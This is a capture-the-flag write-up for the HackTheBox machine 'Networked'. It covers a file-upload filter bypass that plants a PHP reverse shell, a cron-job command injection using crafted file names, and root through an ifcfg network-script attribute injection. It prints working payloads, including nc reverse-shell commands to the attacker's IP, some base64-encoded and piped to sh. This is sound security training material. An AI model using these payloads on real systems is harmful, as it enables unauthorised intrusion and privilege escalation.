---
title: HackTheBox - Networked
categories: [HackTheBox, HackTheBox - Linux]
date: 2022-09-13
tags: [exploit/file-upload-bypass, exploit/command-injection]
img_path: /Writeups/HackTheBox/Linux/Networked/images/
image:
  src: Pasted%20image%2020220913201610.png
  width: 1000   # in pixels
  height: 400   # in pixels
---


# Overview 
This machine begins w/ a web enumeration, discovering a page where users can **only** upload images onto the system due to the filters in place, however it can be bypassed by changing the content type (1), filename (2) and adding a GIF header (3), allowing us to upload  `php-reverse-shell.php`, obtaining a low-privilege/`www-data` shell.

For the privilege escalation part, we have to privilege escalate to `guly` and then to `root`. After some enumeration, there is a cronjob that is executing a script `check_attack.php` as `guly`.  The purpose of that script is to check if files in `/var/www/html/uploads` have a valid IP address in its name, otherwise delete it. The script is vulnerable to command injection due to passing user input directly into `exec()`, privilege escalating us to user `guly`.

User `guly` has a sudoers entry, that allows `guly` to execute `change_name.sh` as `root`, the purpose of the script is to add attributes into `guly` network script. The script is vulnerable because it is writing to a network script file. The vulnerability resides in how attributes in network scripts are handled. If there is a white space in the attribute, system will try to execute the word after the whitespace, allowing us to privilege escalate to `root`.

If you wish to practice boxes similar to this, try VulnHub PwnLab

---

| Column       | Details                                                    |
| ------------ | ---------------------------------------------------------- |
| Box Name     | Networked                                                           |
| IP           | 10.10.10.146                                               |
| Points       | 20                                                         |
| Difficulty   | Easy                                                       |
| Creator      | [guly](https://www.hackthebox.com/home/users/profile/8292) |
| Release Date | 24-Aug-2019                                                |


# Recon

## TCP/80 (HTTP)
- FFUF
```
301      GET        7l       20w      235c http://10.10.10.146/backup => http://10.10.10.146/backup/
403      GET        8l       22w      210c http://10.10.10.146/cgi-bin/
403      GET        8l       22w      215c http://10.10.10.146/cgi-bin/.html
200      GET        8l       40w      229c http://10.10.10.146/index.php
200      GET        0l        0w        0c http://10.10.10.146/lib.php
200      GET       22l       88w     1302c http://10.10.10.146/photos.php
200      GET        5l       13w      169c http://10.10.10.146/upload.php
301      GET        7l       20w      236c http://10.10.10.146/uploads => http://10.10.10.146/uploads/
```
- `lib.php`
- `photos.php`
- `upload.php`
- `uploads/`



# Initial Foothold

## TCP/80 (HTTP) - File Upload Bypass
1. After some testing at `http://10.10.10.146/upload.php`, 
		![](Pasted%20image%2020220913004647.png)
	- `.php` - unable to upload
	- `.jpg, .png` - successfully uploaded
	- Uploaded files go to `uploads/<IP Address>.ext`
2. Attempt file [upload bypass](https://yufongg.github.io/posts/Upload-bypass/)
	1. Upload `php-reverse-shell.php`, intercept w/ `burp`
	2. Change POST data
		```
		Content-Disposition: form-data; name="myFile"; filename="php-reverse-shell.php.jpg"
		Content-Type: image/jpg
		
		GIF89a;
		<?php
		...
		```
		![](Pasted%20image%2020220913020708.png)
3. Invoke reverse shell
	```
	┌──(root💀kali)-[~/htb/networked]
	└─# curl http://networked.htb/uploads/10_10_14_19.php.jpg
	```
	![](Pasted%20image%2020220913020924.png)
4. If you want to practice this exact upload bypass, try Vulnhub Pwnlab

# Privilege Escalation

## Guly - Enumeration 
1. Found something interesting in `/home/guly`
	```
	bash-4.2$ ls -la /home/guly                                          
	total 28                                                             
	drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .                           
	drwxr-xr-x. 3 root root  18 Jul  2  2019 ..                          
	lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null  
	-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout                
	-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile               
	-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc                     
	-rw-------  1 guly guly 639 Jul  9  2019 .viminfo                    
	-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php            
	-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly                
	-r--------. 1 guly guly  33 Oct 30  2018 user.txt   
	```
	- `crontab.guly`
	- `check_attack.php`
2. View `check_attack.php`
	![](Pasted%20image%2020220913021555.png)

## Guly - What is check_attack.php doing?
1. What is check_attack.php doing? - TLDR
	1. Once a files is uploaded, its name is changed to the IP address of the machine that uploaded the file. Instead of `'.'`, `'_'` is used. `10_10_14_14.jpg`
	2. Basically, it checks if the files in `/var/www/html/uploads` whether their name is a valid IP address, if it is, do nothing, if isn't append a warning into a log file and then delete the invalid file.
2. Breaking down what check_attack.php is doing
	1. The for loop goes through files residing in `/var/www/html/uploads`, excluding `/var/www/html/index.html`
	2. The `getNameCheck($value)`  function fix the format of the IP address by replacing `'_'` w/ `'.'` and returning the filename  `10.10.10.14` and extension `.jpg`.
	3. The `check_ip($name, $value)` function just checks whether the variable `$name` (`10.10.10.14`) is a valid IP address, if not returns `ret=false`, which means `$check[0]` is NULL.
	4. If `$check[0]` is NULL, append message to log, remove invalid file and mail. (This part is vulnerable)



## Guly - Exploiting check_attack.php 
1. How do we exploit `check_attack.php`? (1)
	1. We are only interested in `exec(...)` because it is code execution.
		>  `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");` is vulnerable because `$value` is passed into `exec`
		{: .prompt-info }
	2. The variable `$value` are files residing in `/var/www/html/uploads/<file>`
	3.  In order to get to the `exec(...)` statement, we simply just have to create a file that is `!= 10_10_10_10.png`, not a valid IP Address.
	
2. How do we exploit `check_attack.php`? (2)
	1. We are able to do command injection by naming the files in `uploads` directory commands we want to execute
		```
		# Create our Command Injection Payload
		touch "/var/www/html/uploads/<Command Injection Payload>"
		touch ";id;whoami;whoami"

		# Our Payload is stored in $value variable
		$value = /var/www/html/uploads/<filename> 
		$value = /var/www/html/uploads/;id;whoami;whoami

		# What it looks like when command injected
		exec("nohup /bin/rm -f /var/www/html/uploads$value > /dev/null 2>&1
		exec("nohup /bin/rm -f /var/www/html/uploads;id;whoami;whoami > /dev/null 2>&1
		```
	4. Create payload
		> 1. Commands we would want to inject will be a reverse shell, most reverse shell requires the character `/`, however, it is not possible to create a file w/ `/` in its filename.
		> 2. Bypass/Overcome the restriction 
			> - We can `base64` encode the payload and then decode it pip it in `sh`
			> - Use `$(which bash)`
		> 3. Our command injection payload is directed into `/dev/null`, 
		> 4. Bypass/Overcome the restriction 
			> - simply add a random command (`;id`) so that that command will be passed to `/dev/null` instead.
			
3. Exploiting `check_attack.php`
	1. Monitor when `check_attack.php` is executed w/ `pspy64`
	2. Create our command injection file (1)
		```
		bash-4.2$ pwd
		/var/www/html/uploads

		bash-4.2$ touch ';nc 10.10.14.19 4444 -e $(which bash);id' 
		
		bash-4.2$ ls -l
		total 44
		-rw-r--r--  1 apache apache 12553 Sep 12 19:43 10_10_14_19.jpg
		-rw-r--r--  1 apache apache  5502 Sep 12 19:44 10_10_14_19.php.jpg
		-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_1.png
		-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_2.png
		-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_3.png
		-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_4.png
		-rw-rw-rw-  1 apache apache     0 Sep 12 23:02 ;nc 10.10.14.19 4444 -e $(which bash);id
		-r--r--r--. 1 root   root       2 Oct 30  2018 index.html
		```
	3. Start listener
	4. Wait for cronjob to execute
		![](Pasted%20image%2020220913050342.png)
	5. `guly` shell obtained
		![](Pasted%20image%2020220913050514.png)
	6. Create our command injection file (2)
		1. Encode Payload
			```
			bash-4.2$ echo 'nc 10.10.14.19 4444 -e /bin/bash' | base64
			bmMgMTAuMTAuMTQuMTkgNDQ0NCAtZSAvYmluL2Jhc2gK
			```
		1. Create file
			```
			bash-4.2$ bash-4.2$ touch ';echo bmMgMTAuMTAuMTQuMTkgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | sh; id'
			```
	7. Start listener
	8. Wait for cronjob to execute
		![](Pasted%20image%2020220913055843.png) 
4. Demo - `check_attack.php` Privilege Escalation
	<html>
	<head>
	<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
	</head>
	<body>
	<div id="check_attack_priv_esc"></div>
	<script src="/asciinema-player.min.js"></script>
	<script>
		AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/check_attack_priv_esc.cast', document.getElementById('check_attack_priv_esc'), { 
		loop: true,
		autoPlay: true
			});
	</script>
	</body>
	</html>

## Root - Enumeration
1. Check `guly` sudo access
	```
	[guly@networked tmp]$ sudo -l
	Matching Defaults entries for guly on networked:
	    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
	    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
	    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
	    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
	    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
	    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
	    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
	
	User guly may run the following commands on networked:
	    (root) NOPASSWD: /usr/local/sbin/changename.sh
	```
	- `/usr/local/sbin/changename.sh`
2. View contents of `/usr/local/sbin/changename.sh`
	![](Pasted%20image%2020220913190525.png)

## Root - What is changename.sh doing?
1. It is assigning some variables and **writing** it into `/etc/sysconfig/network-scripts/ifcfg-guly`
	```
	cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
	DEVICE=guly0
	ONBOOT=no
	NM_CONTROLLED=no
	EoF
	```
2. Create a regex rule
	```
	regexp="^[a-zA-Z0-9_\ /-]+$"

	# Matches:
	1. a-z
	2. A-Z
	3. 0-9
	4. The character '_'
	5. The character '<space>'
	6. The character '/'
	7. The character '-' 
	8. One or MORE times
	```
	![](Pasted%20image%2020220913192306.png)
3. In every `for` loop,
	1. Create variable `$var`, assign it to `NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO` in each loop
		```
		# Loop1:
		$var = NAME
		
		# Loop2:
		$var = PROXY_METHOD
		
		# Loop3
		$var = BROWSER_ONLY
		
		# Loop4
		$var = BOOTPROTO
		```
	2. Print `$var` in each loop
		```
		# Example:
		
		┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit]
		└─# for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo $var; done
		NAME
		PROXY_METHOD
		BROWSER_ONLY
		BOOTPROTO
		```
	1. Accept user input
	2.  Goes into a `while` loop If user input does not match regex expression,
			1. Print "wrong input..." 
			2. Print  `$var`
			3. Accept user input again **until user input matches regex expression**.
	3. Appends output of `$var=<user input>`  into `ifcfg-guly` in each loop
4. Bring interface `guly0` up.
	```
	/sbin/ifup guly0
	```

## Root - Exploiting changename.sh
1. After analyzing `changename.sh`, I could not find any way to do command injection, `echo "$var"` is usually safe, so command injection is not possible.
2. Instead, I googled, `ifcfg privilege escalation`, and found something interesting.
3. How do we exploit `changename.sh` - [source](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
	1. The vulnerability resides in how attributes in network scripts are not handled correctly
	2. If there are whitespaces in the attribute name, `system` will try to execute the word after the white space.
	3. For e.g.
		```
		NAME=testing whoami
		# whoami will be executed by system as root
		```
	4. Spawn `root` shell
		```
		a /bin/bash
		```
4. Exploiting `changename.sh`
	1. Execute `changename.sh` as root
		```
		[guly@networked tmp]$ sudo /usr/local/sbin/changename.sh
		```
	2. Spawn `bash`, privilege escalating to `root`
		```
		[guly@networked tmp]$ sudo /usr/local/sbin/changename.sh
		interface NAME:
		a
		interface PROXY_METHOD:
		a
		interface BROWSER_ONLY:
		a
		interface BOOTPROTO:
		a /bin/bash
		[root@networked network-scripts]# 
		```
5. Demo - `changename.sh` Privilege Escalation
	<html>
	<head>
	<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
	</head>
	<body>
	<div id="change_name_priv_esc"></div>
	<script src="/asciinema-player.min.js"></script>
	<script>
		AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/change_name_priv_esc.cast', document.getElementById('change_name_priv_esc'), { 
		loop: true,
		autoPlay: true
			});
	</script>
	</body>
	</html>




# Additional

## Guly -  What is check_attack.php doing? (In-Depth)
1. Assign some variables
	```
	# Line 2-7
	require '/var/www/html/lib.php';
	$path = '/var/www/html/uploads/';
	$logpath = '/tmp/attack.log';
	$to = 'guly';
	$msg= '';
	$headers = "X-Mailer: check_attack.php\r\n";
	```
2. Create an empty array called `files`
	```
	# Line 9
	$files = array();
	```
3. Populate array w/  files in `/var/www/html/uploads`
	```
	# Line 10
	$files = preg_grep('/^([^.])/', scandir($path));
	```
	```
	# Testing what is Line 10 doing
	
	┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test]
	└─# cat test.php 
	<?php
	$files = preg_grep('/^([^.])/', scandir("/root/htb/networked/10.10.10.146/exploit/test/files"));
	
	foreach($files as $key){
		echo $key . "\n";
	}
	?>
	┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test]
	└─# ls -la /root/htb/networked/10.10.10.146/exploit/test/files
	total 8
	drwxr-xr-x 2 root root 4096 Sep 13 02:27 .
	drwxr-xr-x 3 root root 4096 Sep 13 02:26 ..
	-rw-r--r-- 1 root root    0 Sep 13 02:27 10_10_14_19.png
	-rw-r--r-- 1 root root    0 Sep 13 02:27 asdf
	-rw-r--r-- 1 root root    0 Sep 13 02:27 testing_123.png
	-rw-r--r-- 1 root root    0 Sep 13 02:27 test.png
	
	┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test]
	└─# php test.php 
	10_10_14_19.png
	asdf
	test.png
	testing_123.png
	```
4. In this for loop, and if statement
	```
	# Line 12-16
	foreach ($files as $key => $value) {
			$msg='';
	  if ($value == 'index.html') {
			continue;
	  }
	```
	1. Values in `$files` array are stored in `$key` and assign `$key` to `$value`
	2. If `$value == index.html`, go right back to the loop instead of proceeding to line 20 onwards.
	3. The purpose is to exclude `index.html`, from code (Line 20 onwards) 
5. Pass `$value` into `getNameCheck` function
	```
	# $filename = 10_10_14_19.png
	# Screenshots are for "safe/not attacks" file (10_10_14_19.png)
	# If invalid/unsafe file (asdf) , return array("asdf",NULL)

	function getnameCheck($filename) {
	  $pieces = explode('.',$filename);
	  $name= array_shift($pieces);
	  $name = str_replace('_','.',$name);
	  $ext = implode('.',$pieces);
	  return array($name,$ext);
	}
	```
	1. Separates the filename into parts by `.`
		- for e.g. `10_10_14_19.png`
		- `$pieces[0] = 10_10_14_19.png`
		- `$pieces[1] = .png`
			![](Pasted%20image%2020220913033835.png)
	2. Remove first array in `$pieces` , store it in `$name`
		- `$name = 10_10_14_19`
		![](Pasted%20image%2020220913034200.png)
	3. Replaces `_` in `$name` w/ `.` 
		- `10_10_14_19 to 10.10.14.19`
		![](Pasted%20image%2020220913033458.png)
	4. Get file extension
		- `$ext = png`
		![](Pasted%20image%2020220913034649.png)
	5. Return `array($name,$ext)`
6. Store array into list
	```
	list ($name,$ext) = getnameCheck($value);	
	```
	![](Pasted%20image%2020220913041721.png)
7. Pass `$name, $value` into `check_ip` function
	```
	# $name  = 10.10.14.19      = $prefix
	# $value = 10_10_14_19.png  = $filename
	
	function check_ip($prefix,$filename) {
	  $ret = true;
	  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
		$ret = false;
		$msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
	  } else {
		$msg = $filename;
	  }
	  return array($ret,$msg);
	}
	```
	1. Set `$ret = true`
	2. If IP Address is invalid, 
		- `$ret = false`  
		- `$msg=...not impt...`
			![](Pasted%20image%2020220913042410.png)
	3. If IP Address is Valid
		- `$msg = 10_10_14_19.png`
		- `$ret = true`
			![](Pasted%20image%2020220913041225.png)
	4. Return
		- Valid IP: `array(1,"10_10_14_19.png")`
		- Invalid IP: `array(false,"4tt4ck on file 10_10_14_19.png: prefix is not a valid ip")`
8. If the first value in array `$check` is `false`
	```
	  if (!($check[0])) {
		echo "attack!\n";e
		file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
	
		exec("rm -f $logpath");
		exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
		echo "rm -f $path$value\n";
		mail($to, $msg, $msg, $headers, "-F$value");
	  }
	```
	1. Prints `"attack"`
	2. Append `$msg`  into `/tmp/attack.log`
	3. Remove `/tmp/attack.log`
	4. Remove the invalid/unsafe file
	5. Prints `"rm -f $path$value"`